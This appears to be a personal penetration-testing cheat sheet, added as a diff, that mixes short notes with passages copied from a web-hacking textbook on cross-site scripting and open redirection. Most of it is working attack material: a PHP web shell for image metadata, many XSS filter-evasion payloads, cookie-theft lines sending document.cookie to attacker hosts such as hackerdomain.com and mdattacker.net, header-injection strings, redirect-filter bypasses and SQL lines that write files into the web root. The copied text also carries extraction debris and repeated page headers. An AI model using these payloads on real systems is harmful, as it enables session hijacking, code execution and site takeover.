@@ -1,0 +1,305 @@
+SimpleServer: python -m http.server [Nº Porta]
+Image metadata shell, comment: <?php;echo shell_exec(\$_[GET[\"do\"]);?>
+Teste de Antivírus: X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+Stored XSS %<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
+Refleceted XSS var i=new Image; i.src=”http://hackerdomain.com/”+document.cookie; ou open(”http://hackerdomain.com/”+document.cookie);
+selselectect <scr<script>ipt> alert(1);</scr</script>ipt>
+“><script>alert(document.cookie)</script>
+
+document.write('<iMg onerror=alert(1) src=a>')
+<[%00]img onerror=alert(1) src=a>
+<i[%00]mg onerror=alert(1) src=a>
+
+Browser "TrustedZones" Payload: <script> var o = new ActiveXObject(‘WScript.shell’); o.Run(‘calc.exe’);</script>
+XSS Standard Test: %E2%80%9C%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+                   “><script >alert(document.cookie)</script >
+                   “><ScRiPt>alert(document.cookie)</ScRiPt>
+                   “%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+                   “><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+                   %00“><script>alert(document.cookie)</script>
+
+import urllib.parse
+urllib.parse.quote(string) <= Url encoding
+
+For input forms: “ onfocus=”alert(1)
+
+Here, the string you control is being inserted into the href attribute of an <a> tag. In this context, and in many others in which attributes may contain URLs,
+you can use the javascript: protocol to introduce script directly within the URL attribute:
+javascript:alert(1);
+
+Because your input is being refl ected within a tag attribute, you can also inject an event handler, as already described.
+For an attack that works against all current browsers, you can use an invalid image name together with an onclick event handler:
+#”onclick=”javascript:alert(1)
+
+<xml onreadystatechange=alert(1)>
+<style onreadystatechange=alert(1)>
+<iframe onreadystatechange=alert(1)>
+<object onerror=alert(1)>
+<object type=image src=valid.gif onreadystatechange=alert(1)></object>
+<img type=image src=valid.gif onreadystatechange=alert(1)>
+<input type=image src=valid.gif onreadystatechange=alert(1)>
+<isindex type=image src=valid.gif onreadystatechange=alert(1)>
+<script onreadystatechange=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+</a onmousemove=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+
+<x onclick=alert(1) src=a>Click here</x>
+
+In some situations, you may be able to introduce new tags with various names
+but not fi nd any means of using these to directly execute code. In these situations, you may be able to deliver an attack using a technique known as “base tag
+hijacking.” The <base> tag is used to specify a URL that the browser should use
+to resolve any relative URLs that appear subsequently within the page. If you can
+introduce a new <base> tag, and the page performs any <script> includes after
+your refl ection point using relative URLs, you can specify a base URL to a server
+that you control. When the browser loads the scripts specifi ed in the remainder of
+the HTML page, they are loaded from the server you specifi ed, yet they are still
+executed in the context of the page that has invoked them. For example:
+<base href=”http://mdattacker.net/badscripts/”>
+According to specifi cations, <base> tags should appear within the <head>
+section of the HTML page. However, some browsers, including Firefox, accept
+<base> tags appearing anywhere in the page, considerably widening the scope
+of this attack.
+Space Following the Tag Name
+Several characters can replace the space between the tag name and the fi rst
+attribute name:
+<img/onerror=alert(1) src=a>
+<img[%09]onerror=alert(1) src=a>
+<img[%0d]onerror=alert(1) src=a>
+<img[%0a]onerror=alert(1) src=a>
+<img/”onerror=alert(1) src=a>
+<img/’onerror=alert(1) src=a>
+<img/anyjunk/onerror=alert(1) src=a>
+Note that even where an attack does not require any tag attributes, you should
+always try adding some superfl uous content after the tag name, because this
+bypasses some simple fi lters:
+<script/anyjunk>alert(1)</script>
+Attribute Names
+Within the attribute name, you can use the same NULL byte trick described
+earlier. This bypasses many simple fi lters that try to block event handlers by
+blocking attribute names starting with on:
+<img o[%00]nerror=alert(1) src=a>
+Attribute Delimiters
+In the original example, attribute values were not delimited, requiring some
+whitespace after the attribute value to indicate that it has ended before another
+attribute can be introduced. Attributes can optionally be delimited with double
+or single quotes or, on IE, with backticks:
+<img onerror=”alert(1)”src=a>
+<img onerror=’alert(1)’src=a>
+<img onerror=`alert(1)`src=a>
+Switching around the attributes in the preceding example provides a further
+way to bypass some fi lters that check for attribute names starting with on. If
+the fi lter is unaware that backticks work as attribute delimiters, it treats the
+following example as containing a single attribute, whose name is not that of
+an event handler:
+<img src=`a`onerror=alert(1)>
+By combining quote-delimited attributes with unexpected characters
+following the tag name, attacks can be devised that do not use any whitespace,
+thereby bypassing some simple fi lters:
+<img/onerror=”alert(1)”src=a>
+Attribute Values
+Within attribute values themselves, you can use the NULL byte trick, and you
+also can HTML-encode characters within the value:
+<img onerror=a[%00]lert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+Because the browser HTML-decodes the attribute value before processing
+it further, you can use HTML encoding to obfuscate your use of script code,
+thereby evading many fi lters. For example, the following attack bypasses many
+fi lters seeking to block use of the JavaScript pseudo-protocol handler:
+<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+When using HTML encoding, it is worth noting that browse rs tolerate various deviations from the specifi cations, in ways that even fi lters that are aware
+of HTML encoding issues may overlook. You can use both decimal and hexadecimal format, add superfl uous leading zeros, and omit the trailing semicolon.
+The following examples all work on at least one browser:
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+As described in Chapter 2, something similar can happen when an application
+framework “translates” unusual Unicode characters into their nearest ASCII
+equivalents based on the similarity of their glyphs or phonetics. For example,
+the following input uses Unicode double-angle quotation marks (%u00AB and
+%u00BB) instead of tag brackets:
+«img onerror=alert(1) src=a»
+The application’s input fi lters may allow this input because it does not
+contain any problematic HTML. However, if the application framework translates the quotation marks into tag characters at the point where the input is
+inserted into a response, the attack succeeds. Numerous applications have
+been found vulnerable to this kind of attack, which developers may be forgiven for overlooking.
+Some input fi lters identify HTML tags by simply matching opening and closing angle brackets, extracting the contents, and comparing this to a blacklist
+of tag names. In this situation, you may be able to bypass the fi lter by using
+superfl uous brackets, which the browser tolerates:
+<<script>alert(1);//<</script>
+In some cases, unexpected behavior in browsers’ HTML parsers can be leveraged to deliver an attack that bypasses an application’s input fi lters. For example,
+the following HTML, which uses ECMAScript for XML (E4X) syntax, does not
+contain a valid opening script tag but nevertheless executes the enclosed script
+on current versions of Firefox:
+<script<{alert(1)}/></script>
+
+Furthermore, superfl uous escape characters within strings are ignored:
+<script>eval(‘a\l\ert\(1\)’);</script>
+Dynamically Constructing Strings
+You can use other techniques to dynamically construct strings to use in your attacks:
+<script>eval(‘al’+’ert(1)’);</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
+The fi nal example, which works on Firefox, allows you to decode a Base64-
+encoded command before passing it to eval.
+Alternatives to eval
+If direct calls to the eval command are not possible, you have other ways to
+execute commands in string form:
+<script>’alert(1)’.replace(/.+/,eval)</script>
+<script>function::[‘alert’](1)</script>
+Alternatives to Dots
+If the dot character is being blocked, you can use other methods to perform
+dereferences:
+<script>alert(document[‘cookie’])</script>
+<script>with(document)alert(cookie)</script>
+
+<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
+c12.indd 466 c12.indd 466 8/19/2011 12:12:30 PM 8/19/2011 12:12:30 PM
+Stuttard c12.indd V2 - 08/10/2011 Page 467
+ Chapter 12 n Attacking Users: Cross-Site Scripting 467
+Of course, any of the other characters within the onerror attribute value could
+also be HTML-encoded to further hide the attack:
+<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
+#x29;&#x27;&#x29; src=a>
+This technique enables you to bypass many fi lters on JavaScript code, because
+you can avoid using any
+
+open(“//a/”+document.cookie)
+Alternatively, if you are injecting straight into HTML, the following 30-byte
+tag loads and executes a script from the server with hostname a:
+<script src=http://a></script>
+
+<script>eval(unescape(location))
+</script>#%0Aalert(‘long script here ......’)
+
+HTTP/1.1 200 Ok
+Content-Type: text/xml
+c12.indd 478 c12.indd 478 8/19/2011 12:12:32 PM 8/19/2011 12:12:32 PM
+Stuttard c12.indd V2 - 08/10/2011 Page 479
+ Chapter 12 n Attacking Users: Cross-Site Scripting 479
+Content-Length: 1098
+<xml>
+<data>
+...
+<a xmlns:a=’http://www.w3.org/1999/xhtml’>
+<a:body onload=’alert(1)’/></a>
+...
+</data>
+</xml>
+
+http://mdsec.net/error/5/Error.ashx?message=<scr%00ipt%20
+&message=> alert(‘xss’)</script>
+
+DOM-Based XSS
+
+“<script>alert(1)</script>
+“;alert(1)//
+‘-alert(1)-’
+
+document.location
+document.URL
+document.URLUnencoded
+document.referrer
+window.location
+document.cookie
+
+document.write()
+document.writeln()
+document.body.innerHtml
+eval()
+window.execScript()
+window.setInterval()
+window.setTimeout()
+
+HTTP Header Injection:
+foo%00%0d%0abar
+foo%250d%250abar
+foo%%0d0d%%0a0abar
+
+foo = Cookiename
+bar = value
+
+
+<img src=’http://mdattacker.net/capture?html=
+<form action=”http://mdattacker.net/capture” method=”POST”>
+
+Finding and Exploiting Open Redirection Vulnerabilities
+The fi rst step in locating open redirection vulnerabilities is to identify every
+instance within the application where a redirect occurs. An application can
+cause the user’s browser to redirect to a different URL in several ways:
+n An HTTP redirect uses a message with a 3xx status code and a Location
+header specifying the target of the redirect:
+HTTP/1.1 302 Object moved
+Location: http://mdsec.net/updates/update29.html
+n The HTTP Refresh header can be used to reload a page with an arbitrary
+URL after a fi xed interval, which may be 0 to trigger an immediate redirect:
+HTTP/1.1 200 OK
+Refresh: 0; url=http://mdsec.net/updates/update29.html
+n The HTML <meta> tag can be used to replicate the behavior of any HTTP
+header and therefore can be used for redirection:
+HTTP/1.1 200 OK
+Content-Length: 125
+<html>
+<head>
+<meta http-equiv=”refresh” content=
+“0;url=http://mdsec.net/updates/update29.html”>
+</head>
+</html>
+n Various APIs exist within JavaScript that can be used to redirect the browser
+to an arbitrary URL:
+HTTP/1.1 200 OK
+Content-Length: 120
+<html>
+<head>
+<script>
+document.location=”http://mdsec.net/updates/update29.html”;
+</script>
+</head>
+</html>
+In each of these cases, an absolute or relative URL may be specifi ed.
+
+Session Hijack:
+<script>new image().src="http://IP:PORTA/?cookie="+document.cookie;</script>
+
+The application may check whether the user-supplied string starts with http://
+and, if so, block the request. In this situation, the following tricks may succeed
+in causing a redirect to an external website (note the leading space at the beginning of the third line):
+HtTp://mdattacker.net
+%00http://mdattacker.net
+ http://mdattacker.net
+//mdattacker.net
+%68%74%74%70%3a%2f%2fmdattacker.net
+%2568%2574%2574%2570%253a%252f%252fmdattacker.net
+https://mdattacker.net
+http:\\mdattacker.net
+http:///mdattacker.net
+Alternatively, the application may attempt to sanitize absolute URLs by removing http:// and any external domain specifi ed. In this situation, any of the preceding bypasses may be successful, and the following attacks should also
+be tested:
+http://http://mdattacker.net
+http://mdattacker.net/http://mdattacker.net
+hthttp://tp://mdattacker.net
+Sometimes, the application may verify that the user-supplied string either
+starts with or contains an absolute URL to its own domain name. In this situation, the following bypasses may be effective:
+http://mdsec.net.mdattacker.net
+http://mdattacker.net/?http://mdsec.net
+http://mdattacker.net/%23http://mdsec.net
+
+More SQL Injection Snippets:
+Load files:
+load_file("filename")
+Save data:
+"Command" INTO OUTFILE "/var/www/html/filename"
